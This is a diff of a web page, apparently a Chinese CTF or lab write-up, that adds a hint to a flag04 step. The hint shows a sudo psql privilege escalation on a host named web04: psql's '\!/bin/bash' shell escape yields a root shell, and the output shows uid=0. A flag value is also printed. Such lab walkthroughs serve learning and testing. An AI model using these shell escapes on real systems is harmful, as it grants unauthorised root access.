@@ -1655,7 +1655,49 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 <span class="pl-cce">\?</span>
 <span class="pl-k">!</span>/bin/sh</pre></div>
 <p>提权即可</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">flag04: flag{8ef1d030-83ed-40c2-a512-6e92838b6f7a}</pre></div></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate">flag04: flag{8ef1d030-83ed-40c2-a512-6e92838b6f7a}</pre></div>
+<p>hint</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">默认情况下sudo /usr/local/postgresql/bin/psql执行默认是以root身份启动psql进程然后使用root账户登录PostgreSQL，所以会要求输入root密码。这样显式指定以postgres身份登录数据库即可  
+postgres@web04:/home$ sudo -u root /usr/local/postgresql/bin/psql -U postgres  
+Password <span class="pl-k">for</span> user postgres:  
+Welcome to psql 8.1.0, the PostgreSQL interactive terminal.
+
+Type: <span class="pl-cce">\c</span>opyright <span class="pl-k">for</span> distribution terms  
+<span class="pl-cce">\h</span> <span class="pl-k">for</span> <span class="pl-c1">help</span> with SQL commands  
+<span class="pl-k">?</span> <span class="pl-k">for</span> <span class="pl-c1">help</span> with psql commands  
+<span class="pl-cce">\g</span> or terminate with semicolon to execute query  
+<span class="pl-cce">\q</span> to quit
+
+postgres=<span class="pl-c"><span class="pl-c">#</span> ?  </span>
+General  
+<span class="pl-cce">\c</span>[onnect] [DBNAME<span class="pl-k">|</span>- [USER]]  
+connect to new database (currently <span class="pl-s"><span class="pl-pds">"</span>postgres<span class="pl-pds">"</span></span>)  
+<span class="pl-cce">\c</span>d [DIR] change the current working directory  
+<span class="pl-cce">\c</span>opyright show PostgreSQL usage and distribution terms  
+<span class="pl-cce">\e</span>ncoding [ENCODING]  
+show or <span class="pl-c1">set</span> client encoding  
+<span class="pl-cce">\h</span> [NAME] <span class="pl-c1">help</span> on syntax of SQL commands, <span class="pl-k">*</span> <span class="pl-k">for</span> all commands  
+<span class="pl-cce">\q</span> quit psql  
+<span class="pl-cce">\s</span>et [NAME [VALUE]]  
+<span class="pl-c1">set</span> internal variable, or list all <span class="pl-k">if</span> no parameters  
+<span class="pl-cce">\t</span>iming toggle timing of commands (currently off)  
+<span class="pl-cce">\u</span>nset NAME <span class="pl-c1">unset</span> (delete) internal variable  
+<span class="pl-k">!</span> [COMMAND] execute <span class="pl-c1">command</span> <span class="pl-k">in</span> shell or start interactive shell
+
+Query Buffer  
+<span class="pl-cce">\e</span> [FILE] edit the query buffer (or file) with external editor  
+<span class="pl-cce">\g</span> [FILE] send query buffer to server (and results to file or <span class="pl-k">|</span>pipe)  
+<span class="pl-cce">\p</span> show the contents of the query buffer  
+<span class="pl-cce">\r</span> reset (clear) the query buffer  
+<span class="pl-cce">\w</span> FILE write query buffer to file
+
+Input/Output  
+<span class="pl-cce">\e</span>cho [STRING] write string to standard output  
+<span class="pl-cce">\i</span> FILE execute commands from file  
+<span class="pl-cce">\o</span> [FILE] send all query results to file or <span class="pl-k">|</span>pipe  
+<span class="pl-k">!</span>/bin/bash  
+root@web04:/home# id  
+uid=0(root) gid=0(root) groups=0(root)</pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
